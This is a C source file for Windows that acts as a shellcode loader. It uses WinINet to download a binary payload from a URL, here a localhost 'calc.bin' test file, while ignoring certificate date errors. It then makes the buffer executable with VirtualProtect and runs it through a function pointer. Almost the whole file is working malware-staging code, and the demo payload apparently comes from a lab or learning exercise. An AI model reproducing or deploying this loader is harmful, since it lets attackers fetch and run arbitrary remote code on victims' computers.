#include <Windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment (lib, "Wininet.lib")
/*
Downloads file, reads the shellcode, allocates space, the executes it via function pointer.
*/

#define error(FUNCTIONNAME) printf("[-] %s Failed With Error : %d\n", #FUNCTIONNAME, GetLastError()) // function error
#define log(LOGTEXT) printf("[+] %s\n", #LOGTEXT)
#define generror(ERRTEXT) printf("[-] %s\n", #ERRTEXT) // general error

BOOL DownloadPayload(LPCWSTR PayloadUrl, SIZE_T* sFinalSize, PBYTE* pPayload) {
	SIZE_T sSize = NULL;
	DWORD dwNumofBytesRead = NULL;

	HINTERNET hUrl = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (!hUrl) {
		error(InternetOpenW);
		return FALSE;
	}

	HINTERNET hFile = InternetOpenUrlW(hUrl, PayloadUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (!hFile) {
		error(InternetOpenUrlW);
		return FALSE;
	}

	PBYTE pTmp = NULL;
	PBYTE pStoredBuffer = NULL;

	pTmp = (PBYTE)LocalAlloc(LPTR, 1024);
	if (!pTmp) {
		error(LocalAlloc);
		return FALSE;
	}

	while (TRUE) {
		// basic socket programming to read 1024 bytes continuously until the input ends
		if (!InternetReadFile(hFile, pTmp, 1024, &dwNumofBytesRead)) {
			error(InternetReadFile);
			return FALSE;
		}
		sSize += dwNumofBytesRead;
		// allocate the stored buffer since not allocated yet
		if (!pStoredBuffer) {
			pStoredBuffer = (PBYTE)LocalAlloc(LPTR, dwNumofBytesRead);
		}
		// subsequent reallocations on the heap as more data is read
		// initialise newly allocated space to null
		else {
			pStoredBuffer = (PBYTE)LocalReAlloc(pStoredBuffer, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}
		if (!pStoredBuffer) {
			generror(Could not allocate pStoredBuffer somewhere);
		}
		// append to the end and set tmp buffer to 0
		memcpy((PVOID)(pStoredBuffer + (sSize - dwNumofBytesRead)), pTmp, dwNumofBytesRead);
		memset(pTmp, '\0', dwNumofBytesRead);

		if (dwNumofBytesRead < 1024) {
			break;
		}
	}
	*pPayload = pStoredBuffer;
	*sFinalSize = sSize;

    InternetCloseHandle(hUrl);											 
    InternetCloseHandle(hFile);										
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
    LocalFree(pTmp);	

	return TRUE;
}

int main(int argc, char* argv[]) {
	SIZE_T sSize = NULL;
	PBYTE pPayload = NULL;
	LPCWSTR PayloadUrl = L"http://127.0.0.1:8080/calc.bin";
	DWORD dwOldProtection = NULL;

	log(Downloading payload...);
	if (!DownloadPayload(PayloadUrl, &sSize, &pPayload)) {
		generror(Could not download payload);
		return -1;
	}
	log(Payload downloaded);
	log(Executing shellcode as main process!);
	VirtualProtect(pPayload, sSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	typedef void (*ShellcodeFunction)();
	ShellcodeFunction fnShellcode = (ShellcodeFunction)pPayload;
	fnShellcode();
}